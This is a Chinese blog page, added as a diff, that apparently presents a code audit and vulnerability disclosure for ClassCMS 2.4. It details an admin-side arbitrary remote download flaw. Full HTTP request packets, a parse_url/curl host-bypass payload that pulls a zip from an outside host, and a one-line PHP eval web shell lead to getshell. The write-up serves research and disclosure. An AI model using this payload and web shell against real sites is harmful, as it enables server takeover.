@@ -1,0 +1,476 @@
+<html>
+<head>
+    <meta charset="utf-8" />
+<meta name="description" content="" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+
+<title>ClassCMS2.4代码审计 | 6right</title>
+
+<link rel="shortcut icon" href="https://liangyueliangyue.github.io/favicon.ico?v=1686021349967">
+
+<link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://liangyueliangyue.github.io/styles/main.css">
+<!-- <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/css/bootstrap.min.css"> -->
+
+<script src="https://cdn.jsdelivr.net/npm/@highlightjs/cdn-assets/highlight.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/9.12.0/languages/dockerfile.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/9.12.0/languages//dart.min.js"></script>
+
+<!-- <script src="https://cdn.jsdelivr.net/npm/moment@2.27.0/moment.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/js/bootstrap.min.js"></script> -->
+<!-- DEMO JS -->
+<!--<script src="media/scripts/index.js"></script>-->
+
+
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.css">
+</head>
+<body>
+<div class="main gt-bg-theme-color-first">
+    <nav class="navbar navbar-expand-lg">
+    <a class="navbar-brand" href="/">
+        <img class="user-avatar" src="/images/avatar.png" alt="头像">
+        <div class="site-name gt-c-content-color-first">
+            6right
+        </div>
+    </a>
+    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
+        aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation" id="changeNavbar">
+        <i class="fas fa-bars gt-c-content-color-first" style="font-size: 18px"></i>
+    </button>
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+        <div class="navbar-nav mr-auto" style="text-align: center">
+            
+            <div class="nav-item">
+                
+                <a href="/" class="menu gt-a-link">
+                    首页
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/archives" class="menu gt-a-link">
+                    归档
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/tags" class="menu gt-a-link">
+                    标签
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/post/about" class="menu gt-a-link">
+                    关于
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/friends" class="menu gt-a-link">
+                    友链
+                </a>
+                
+            </div>
+            
+        </div>
+        <div style="text-align: center">
+            <form id="gridea-search-form" style="position: relative" data-update="1686021349967"
+                action="/search/">
+                <input class="search-input" autocomplete="off" spellcheck="false" name="q" placeholder="搜索文章" />
+                <i class="fas fa-search gt-c-content-color-first" style="position: absolute; top: 9px; left: 10px;"></i>
+            </form>
+        </div>
+    </div>
+</nav>
+<script>
+    /* 移动端导航栏展开/收起切换 */
+    document.getElementById('changeNavbar').onclick = () => {
+        var element = document.getElementById('navbarSupportedContent');
+        if (element.style.display === 'none' || element.style.display === '') {
+            element.style.display = 'block';
+        } else {
+            element.style.display = 'none';
+        }
+    }
+</script>
+
+    <div class="post-container">
+        <div class="post-detail gt-bg-theme-color-second">
+            <article class="gt-post-content">
+                <h2 class="post-title">
+                    ClassCMS2.4代码审计
+                </h2>
+                <div class="post-info">
+                    <time class="post-time gt-c-content-color-first">
+                        · 2022-01-13 ·
+                    </time>
+                    
+                        <a href="https://liangyueliangyue.github.io/tag/X7hB2du4e/" class="post-tags">
+                            # 代码审计
+                        </a>
+                    
+                </div>
+                <div class="post-content">
+                    <h2 id="classcms24代码审计">ClassCMS2.4代码审计</h2>
+<h3 id="前言">前言</h3>
+<p>首发于先知社区：<a href="https://xz.aliyun.com/t/10776">ClassCMS2.4代码审计</a></p>
+<p>此次漏洞分析皆在本地测试，且漏洞已经提交至cnvd平台</p>
+<h3 id="漏洞url">漏洞url</h3>
+<p>需要后台管理员权限</p>
+<pre><code>http:///ClassCMS/admin666?do=shop:downloadClass&amp;ajax=1
+</code></pre>
+<h3 id="漏洞点">漏洞点</h3>
+<p>在后台的 管理-&gt;应用管理-&gt;应用下载处存在任意远程文件下载</p>
+<figure data-type="image" tabindex="1"><img src="https://img-blog.csdnimg.cn/img_convert/68ea61f03831a14cb763bf6a47ba23cb.png" alt="image-20211216154721267" loading="lazy"></figure>
+<figure data-type="image" tabindex="2"><img src="https://img-blog.csdnimg.cn/img_convert/4e416a3b41349cd36bb21abf4fa9a664.png" alt="image-20211216154736162" loading="lazy"></figure>
+<p>先放掉第一个请求包</p>
+<pre><code>POST /admin666?do=shop:index&amp;ajax=1&amp;action=fileurl&amp;from=install HTTP/1.1
+Host: classcms
+Content-Length: 43
+Accept: application/json, text/javascript, */*; q=0.01
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Origin: http://classcms
+Referer: http://classcms/admin666?do=shop:index&amp;bread=%E8%87%AA%E5%AE%9A%E4%B9%89%E8%A1%A8%E5%8D%95&amp;action=detail&amp;classhash=diyform
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: token_2ab421=9632c6413dde844887912fd77a75a07f; csrf_2ab421=1547308b
+Connection: close
+
+classhash=diyform&amp;version=1.1&amp;csrf=1547308b
+</code></pre>
+<p>然后修改第二个请求包</p>
+<pre><code>POST /admin666?do=shop:downloadClass&amp;ajax=1 HTTP/1.1
+Host: classcms
+Content-Length: 85
+Accept: application/json, text/javascript, */*; q=0.01
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Origin: http://192.168.159.1
+Referer: http://192.168.159.1/ClassCMS/admin666?do=shop:index&amp;bread=%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91&amp;action=detail&amp;classhash=classcreate
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: token_2ab421=5d012ca838cc5f0aff02c44c8e2c91e7; csrf_2ab421=338ceb00
+Connection: close
+
+classhash={dir}&amp;url=http://@{ip}:{port}@classcms.com/{shell.zip}&amp;csrf=338ceb00
+</code></pre>
+<p>参数解析</p>
+<ul>
+<li>
+<p>classhash为解压出来的最后文件名</p>
+</li>
+<li>
+<p>url为了绕过过滤设成如下形式</p>
+<pre><code>http://@192.168.159.1:80@classcms.com/shell.zip
+远程ip端口（默认80也需要加上），一个包含木马文件（shell.php）的zip压缩包
+</code></pre>
+</li>
+<li>
+<p>csrf参数不动即可</p>
+</li>
+</ul>
+<p>发送之后返回:安装包格式错误，请重试</p>
+<p>就说明已经成功被下载到目标服务器上并解压</p>
+<p>最后访问url即可执行上传上的木马getshell</p>
+<pre><code>http://192.168.159.1/ClassCMS/class/{classhash的值}/{上传压缩包中的木马文件}
+</code></pre>
+<h3 id="漏洞测试">漏洞测试</h3>
+<h4 id="首先黑盒测试"><strong>首先黑盒测试</strong></h4>
+<p>在下载的第二个请求包中发现url参数解码为classcms官网的应用压缩包地址</p>
+<pre><code>POST /admin666?do=shop:downloadClass&amp;ajax=1 HTTP/1.1
+Host: classcms
+Content-Length: 140
+Accept: application/json, text/javascript, */*; q=0.01
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Origin: http://classcms
+Referer: http://classcms/admin666?do=shop:index&amp;bread=%E8%87%AA%E5%AE%9A%E4%B9%89%E8%A1%A8%E5%8D%95&amp;action=detail&amp;classhash=diyform
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: token_2ab421=9632c6413dde844887912fd77a75a07f; csrf_2ab421=1547308b
+Connection: close
+
+classhash=diyform&amp;url=http%3A%2F%2Fclasscms.com%2Fshop%2F%3Faction%3Ddownload%26version%3D1.1%26classhash%3Ddiyform%26token%3D&amp;csrf=1547308b
+</code></pre>
+<p>可能存在远程下载</p>
+<blockquote>
+<p>http://classcms.com/shop/?action=download&amp;version=1.1&amp;classhash=diyform&amp;token=</p>
+</blockquote>
+<p>尝试修改url，得到报错回显</p>
+<figure data-type="image" tabindex="3"><img src="https://img-blog.csdnimg.cn/img_convert/9def42f923f360cb4fe45aa9ddc75d40.png" alt="image-20211216160945402" loading="lazy"></figure>
+<p>Unicode解码得到  ：下载失败</p>
+<h4 id="进行白盒测试"><strong>进行白盒测试</strong></h4>
+<p>回到源码来，通过全局搜索报错提示（下载失败）定位到源码在/class/shop/shop.php中</p>
+<figure data-type="image" tabindex="4"><img src="https://img-blog.csdnimg.cn/img_convert/0724ba40c38c3b071333bd4848d0e67a.png" alt="image-20211216161043875" loading="lazy"></figure>
+<p>一处为在downloadClass函数中一处在upgradeClass函数中，观察功能显然是在downloadClass中</p>
+<pre><code class="language-php"> function downloadClass() {
+    	。。。。。。
+        if(!C('this:download',$url,$classfile)) {
+            Return C('cms:common:echoJson',array('msg'=&gt;&quot;下载失败&quot;,'error'=&gt;1));
+        }
+        。。。。。。
+    }
+</code></pre>
+<p>在this(当前文件shop.php)-&gt;download函数下,定位到关键函数</p>
+<pre><code class="language-php">function download($url,$filepath) {
+        $hosts=array_merge(explode(';',C('this:defaultHost')),array(config('host')));
+        if($defaulthost=config('defaulthost')) {
+            $hosts=array_merge($hosts,explode(';',$defaulthosts));
+        }
+        $checkurl=parse_url($url);
+        if(!isset($checkurl['host']) || !in_array($checkurl['host'],$hosts)) {
+            Return false;
+        }
+        $curl=curl_init();
+        curl_setopt($curl,CURLOPT_URL,$url);
+        if(!$fp = @fopen ($filepath,'w+')) {
+            Return false;
+        }
+        curl_setopt($curl,CURLOPT_FILE, $fp);
+        curl_setopt($curl,CURLOPT_CONNECTTIMEOUT,10);
+        curl_setopt($curl,CURLOPT_TIMEOUT,300);
+        curl_setopt($curl,CURLOPT_SSL_VERIFYPEER,FALSE);
+        curl_setopt($curl,CURLOPT_SSL_VERIFYHOST,FALSE);
+        curl_setopt($curl,CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_0);
+        curl_setopt($curl,CURLOPT_POST,1);
+        curl_setopt($curl,CURLOPT_POSTFIELDS,C('this:shopInfo'));
+        $info=curl_exec($curl);
+        $httpinfo=curl_getinfo($curl);
+        curl_close($curl);
+        fclose($fp);
+        if($httpinfo['http_code']&gt;=300) {@unlink($filepath);Return false;}
+        Return $info;
+    }
+</code></pre>
+<p>函数首先获取了默认允许的host，在this(前文件下)-&gt;defaultHost函数中</p>
+<figure data-type="image" tabindex="5"><img src="https://img-blog.csdnimg.cn/img_convert/fa48a26bd9391e5cd6deec7baa91bac9.png" alt="image-20211216155027088" loading="lazy"></figure>
+<p>只允许 classcms.com;classcms.uuu.la</p>
+<p>这里可以抓包调试一下，可以看到确实是获取了这两个根域（虽然数组是三个）</p>
+<figure data-type="image" tabindex="6"><img src="https://img-blog.csdnimg.cn/img_convert/979acc562b15e8b241488ebea4be7d25.png" alt="image-20211216163555764" loading="lazy"></figure>
+<p>然后将我们传入的url (这里是http://192.168.159.1/1.txt) 通过parse_url函数解析后在判断是否是在数组中</p>
+<p>我们的攻击url也就是down在了这里，那么目标就是绕过这个判断然后执行接下来的curl命令</p>
+<pre><code class="language-php">if(!isset($checkurl['host']) || !in_array($checkurl['host'],$hosts)) {
+    Return false;        
+}
+</code></pre>
+<p>前一个条件存在是肯定满足的，那么只需要让经过parse_url解析过的host键值和数组相等即可</p>
+<p>这里利用php中的parse_url函数和lib_curl对url的解析差异,导致了对host的过滤失效来进行绕过</p>
+<ul>
+<li>php-curl拓展解析的url host在第首个@之后</li>
+<li>而parse_url则是最后一个@之后</li>
+</ul>
+<blockquote>
+<p>所以构造处payload</p>
+<p>http://@192.168.159.1:80@classcms.com/1.zip</p>
+</blockquote>
+<p>本地尝试绕过</p>
+<pre><code class="language-php">&lt;?php
+    $hosts = [&quot;classcms.com&quot;,&quot;classcms.uuu.la&quot;,&quot;classcms.com&quot;];
+	$url = &quot;http://@192.168.159.1:80@classcms.com/1.zip&quot;;
+	$checkurl = parse_url($url);
+	var_dump($checkurl);
+	if(!isset($checkurl['host']) || !in_array($checkurl['host'],$hosts)) {
+        echo &quot;nono!&quot;;
+    }else{
+        echo &quot;success!&quot;;
+    }
+?&gt;
+</code></pre>
+<p>成功绕过</p>
+<figure data-type="image" tabindex="7"><img src="https://img-blog.csdnimg.cn/img_convert/d6b19aa06c0196ea09a69c0ded481540.png" alt="image-20211216164910824" loading="lazy"></figure>
+<p>绕过之后尝试执行curl</p>
+<pre><code class="language-php">&lt;?php
+    $hosts = [&quot;classcms.com&quot;,&quot;classcms.uuu.la&quot;,&quot;classcms.com&quot;];
+	$url = &quot;http://@192.168.159.1:80@classcms.com/1.zip&quot;;
+	$checkurl = parse_url($url);
+	//var_dump($checkurl);
+	if(!isset($checkurl['host']) || !in_array($checkurl['host'],$hosts)) {
+        echo &quot;nono!&quot;;
+    }else{
+        echo &quot;success!&quot;;
+        $curl=curl_init();
+        curl_setopt($curl,CURLOPT_URL,$url);
+        curl_setopt($curl,CURLOPT_CONNECTTIMEOUT,10);
+        curl_setopt($curl,CURLOPT_TIMEOUT,300);
+        curl_setopt($curl,CURLOPT_SSL_VERIFYPEER,FALSE);
+        curl_setopt($curl,CURLOPT_SSL_VERIFYHOST,FALSE);
+        curl_setopt($curl,CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_0);
+        curl_setopt($curl,CURLOPT_POST,1);
+        $info=curl_exec($curl);
+        $httpinfo=curl_getinfo($curl);
+        var_dump($info,$httpinfo);
+        curl_close($curl);}
+?&gt;
+</code></pre>
+<p>成功执行curl完成远程下载</p>
+<figure data-type="image" tabindex="8"><img src="https://img-blog.csdnimg.cn/img_convert/5862d22bfc117d4d05a1499516a8d534.png" alt="image-20211216181447914" loading="lazy"></figure>
+<p>那么构造一个木马文件 lyy.php</p>
+<pre><code>&lt;?php phpinfo();@eval($_POST['lyy']);?&gt;
+</code></pre>
+<p>压缩成zip文件  lyy.zip  然后构造请求包</p>
+<pre><code>POST /admin666?do=shop:downloadClass&amp;ajax=1 HTTP/1.1
+Host: classcms
+Content-Length: 66
+Accept: application/json, text/javascript, */*; q=0.01
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Origin: http://classcms
+Referer: http://classcms/admin666?do=shop:index&amp;bread=%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91&amp;action=detail&amp;classhash=classcreate
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: token_2ab421=9632c6413dde844887912fd77a75a07f; csrf_2ab421=1547308b;
+Connection: close
+
+classhash=test&amp;url=http://@192.168.159.1:80@classcms.com/lyy.zip&amp;csrf=1547308b
+</code></pre>
+<p>可以看到已经成功绕过那个if条件，并且执行curl下载成功（返回true）</p>
+<figure data-type="image" tabindex="9"><img src="https://img-blog.csdnimg.cn/img_convert/74b0f7de29695c8665602bbc6526ea7d.png" alt="image-20211216182107628" loading="lazy"></figure>
+<p>虽然最后还是报错安装包格式错误，请重试</p>
+<p>但是可以看到他在unzip方法处理后的if中而不是else中，说明已经成功下载并解压</p>
+<figure data-type="image" tabindex="10"><img src="https://img-blog.csdnimg.cn/img_convert/841ab0b71788e936838815562abc919b.png" alt="image-20211216183159966" loading="lazy"></figure>
+<p>而cms目录下的class.php中的unzip也很简单</p>
+<pre><code class="language-php">function unzip($src_file, $dest_dir=false, $create_zip_name_dir=true, $overwrite=true)     {
+    if(class_exists('ZipArchive')) {
+        $zip = new ZipArchive;
+        if ($zip-&gt;open($src_file) === TRUE)            {
+            if(@$zip-&gt;extractTo($dest_dir)) {
+                $zip-&gt;close();
+                Return true;                
+            }
+            $zip-&gt;close();
+        }       
+        。。。    
+    }
+</code></pre>
+<ul>
+<li>
+<p>$src_file就是D:\phpStudy\PHPTutorial\WWW\ClassCMS\cache\shop\89a5f4d7d35347db4dd558079c11a612.class</p>
+<ul>
+<li>是curl之后产生的一个临时文件</li>
+</ul>
+</li>
+<li>
+<p>$dest_dir就是D:\phpStudy\PHPTutorial\WWW\ClassCMS\class\test\</p>
+<ul>
+<li>/class/{classhash参数值}的目录</li>
+</ul>
+</li>
+</ul>
+<p>所以函数的作用就是存在ZipArchive类(php_zip拓展,默认开启)时，解压临时文件内容到/class/{classhash参数值}的目录</p>
+<p>所以最后木马文件的访问执行payload为</p>
+<pre><code>http://ClassCMS/class/{classhash的值}/{上传压缩包中的木马文件}这里为http://ClassCMS/class/test/lyy.php
+</code></pre>
+<p>成功执行代码并getshell</p>
+<figure data-type="image" tabindex="11"><img src="https://img-blog.csdnimg.cn/img_convert/04b702b810bf79f51ebfbc7e12691087.png" alt="image-20211216183731640" loading="lazy"></figure>
+<figure data-type="image" tabindex="12"><img src="https://img-blog.csdnimg.cn/img_convert/2df304184ef3811b5f32024c9b9f4e30.png" alt="image-20211216184320671" loading="lazy"></figure>
+<h3 id="后记">后记</h3>
+<p>这个漏洞是php curl 和 parse_url的解析差异导致的，是2017年blackhat上orange师傅的:<a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf"> A New Era of SSRF </a>中提到的</p>
+<p>在较新版本的curl（curl&gt;=7.54.0）中已经修复了多个@的解析问题,使用多个@会报错</p>
+<p>由于没有找到php和curl对应版本资料（哪位大师傅知道可以告诉我），这里我测试了phpstudy上的所有php版本，下面两个已经修复</p>
+<figure data-type="image" tabindex="13"><img src="https://img-blog.csdnimg.cn/img_convert/2c20379fc17a96b0108e0a9b3e71ab6f.png" alt="image-20211220154718767" loading="lazy"></figure>
+
+                </div>
+            </article>
+        </div>
+
+        
+            <div class="next-post">
+                <div class="next gt-c-content-color-first">下一篇</div>
+                <a href="https://liangyueliangyue.github.io/post/art1/" class="post-title gt-a-link">
+                    记一次从源码泄露到getshell
+                </a>
+            </div>
+        
+
+        
+            <span id="/post/classcms24-dai-ma-shen-ji/" class="leancloud_visitors" data-flag-title="ClassCMS2.4代码审计">
+                <em class="post-meta-item-text">阅读量 </em>
+                <i class="leancloud-visitors-count">0</i>
+            </span>
+        
+
+        
+
+        
+            <script src='https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js'></script>
+
+<style>
+	div#vcomments{
+		width:100%;
+		max-width: 1000px;
+		padding: 2.5%
+	}
+</style>
+
+
+	<div id="vcomments"></div>
+
+<script>
+	new Valine({
+		el: '#vcomments',
+		appId: 'QR1YL8ep02tLdNVejam0Whhv-gzGzoHsz',
+		appKey: 'I37Ekl4E78WEw4EpQ5WRlzxL',
+		avatar: 'monsterid',
+		pageSize: 5,
+		recordIp: false,
+		placeholder: '留下你的评论！',
+		visitor: true,
+	});
+</script>
+
+        
+
+        <div class="site-footer gt-c-content-color-first">
+    <div class="slogan gt-c-content-color-first">温润如玉</div>
+    <div class="social-container">
+        
+            
+                <a href="https://github.com/liangyueliangyue" target="_blank">
+                    <i class="fab fa-github gt-c-content-color-first"></i>
+                </a>
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+    </div>
+    <div class="footer-info">
+        Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+    </div>
+    <div>
+        Theme <a href="https://github.com/imhanjie/gridea-theme-pure" target="_blank">Pure</a>, Powered by <a
+                href="https://gridea.dev" target="_blank">Gridea</a> | <a href="https://liangyueliangyue.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+</div>
+
+<script>
+  hljs.highlightAll()
+</script>
+
+    </div>
+</div>
+</body>
+</html>
